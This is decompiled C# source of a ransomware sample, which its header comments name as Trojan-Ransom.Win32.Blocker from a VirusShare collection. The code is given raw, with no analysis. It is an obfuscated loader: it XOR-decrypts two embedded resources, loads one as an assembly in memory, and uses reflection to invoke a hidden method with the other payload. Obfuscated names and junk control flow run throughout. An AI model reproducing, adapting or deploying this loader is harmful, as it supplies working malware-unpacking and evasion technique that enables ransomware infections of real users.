// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SEX2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=a5787988e1da7ee4
// MVID: 027F678B-7D46-4866-9354-BA5F76CF2B30
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asdg-51ed8d1a92fbb8f059c9595d28994dd3b17eb92e.exe

using \u0001;
using \u000F;
using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;

namespace \u000F
{
  internal sealed class \u0008
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    static \u0008() => \u0004.\u0002(typeof (\u000F.\u0008));

    private static void \u0002()
    {
      ResourceManager resourceManager;
      string str1;
      byte[] numArray1;
      string str2;
      byte[] numArray2;
      try
      {
        try
        {
          while (\u0007.\u0002())
          {
            if (true)
            {
              if (true)
                resourceManager = new ResourceManager(\u000F.\u0008.\u0001(7890), \u0098\u0004.\u001A\u0005());
              str1 = (string) resourceManager.GetObject(\u000F.\u0008.\u0001(7899));
            }
            str2 = (string) resourceManager.GetObject(\u000F.\u0008.\u0001(7912));
            if (true)
            {
              \u001B\u0003.\u007E\u0006\u0006((object) resourceManager);
              numArray1 = \u000F.\u0008.\u0002(\u0006\u0005.\u007E\u009D\u0005((object) \u0005\u0005.\u009E\u0005(), str1), \u000F.\u0008.\u0001(7921));
              if (false)
                break;
              numArray2 = \u000F.\u0008.\u0002(\u0006\u0005.\u007E\u009D\u0005((object) \u0005\u0005.\u009E\u0005(), str2), \u000F.\u0008.\u0001(7921));
              \u000F.\u0008.\u0002(numArray2, numArray1);
              break;
            }
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[5]
        {
          (object) resourceManager,
          (object) str1,
          (object) str2,
          (object) numArray1,
          (object) numArray2
        };
        \u000E.\u0008.\u0002(ex, objArray);
      }
    }

    public static void \u0002([In] byte[] obj0, [In] byte[] obj1)
    {
      Type[] typeArray;
      int index1;
      Type type;
      MethodInfo[] methodInfoArray1;
      MethodInfo[] methodInfoArray2;
      int index2;
      MethodInfo methodInfo;
      object[] objArray1;
      Assembly assembly1;
      Type[] types;
      try
      {
        Assembly assembly2 = Assembly.Load(obj0);
        if (true)
          goto label_14;
label_1:
        if (true)
          goto label_15;
label_11:
        for (; index2 < methodInfoArray2.Length; ++index2)
        {
          methodInfo = methodInfoArray2[index2];
          if (\u0081\u0003.\u007E\u008F((object) \u0010\u0003.\u007E\u0019((object) methodInfo), \u000F.\u0008.\u0001(7951)))
          {
            if (true)
              objArray1 = new object[3]
              {
                (object) true,
                (object) \u0010\u0003.\u007E\u001C\u0005((object) \u0098\u0004.\u001A\u0005()),
                null
              };
            objArray1[2] = (object) obj1;
            object obj = \u009E\u0004.\u007E\u008A\u0005((object) methodInfo, (object) null, objArray1);
          }
        }
label_12:
        ++index1;
label_13:
        while (index1 < typeArray.Length)
        {
          type = typeArray[index1];
          while (\u0081\u0003.\u007E\u008F((object) \u0010\u0003.\u007E\u0019((object) type), \u000F.\u0008.\u0001(7938)))
          {
            methodInfoArray1 = \u001F\u0004.\u007E\u0087\u0003((object) type);
            if (true)
            {
              methodInfoArray2 = methodInfoArray1;
              index2 = 0;
              if (true)
                goto label_11;
            }
            else
              goto label_13;
          }
          goto label_12;
        }
        return;
label_15:
        types = assembly1.GetTypes();
        typeArray = types;
        index1 = 0;
        goto label_13;
label_14:
        assembly1 = assembly2;
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objArray2 = new object[12]
        {
          (object) assembly1,
          (object) types,
          (object) type,
          (object) methodInfoArray1,
          (object) methodInfo,
          (object) objArray1,
          (object) typeArray,
          (object) index1,
          (object) methodInfoArray2,
          (object) index2,
          (object) obj0,
          (object) obj1
        };
        \u0008.\u0008.\u0002(ex, objArray2);
        throw;
      }
    }

    public static byte[] \u0002([In] byte[] obj0, [In] string obj1)
    {
      int index;
      byte[] bytes;
      int num;
      try
      {
        num = 350;
        bytes = \u0005\u0005.\u009C\u0005().GetBytes(obj1);
        for (index = 0; index < obj0.Length; ++index)
          obj0[index] ^= (byte) ((int) bytes[index % bytes.Length] >> index + num + bytes.Length & (int) byte.MaxValue);
        return obj0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num;
        byte[] numArray1 = bytes;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) index;
        byte[] numArray2 = obj0;
        string str = obj1;
        \u0008.\u0008.\u0002(ex, (object) local1, (object) numArray1, (object) local2, (object) numArray2, (object) str);
        throw;
      }
    }

    public \u0008()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex, (object) this);
        throw;
      }
    }
  }
}
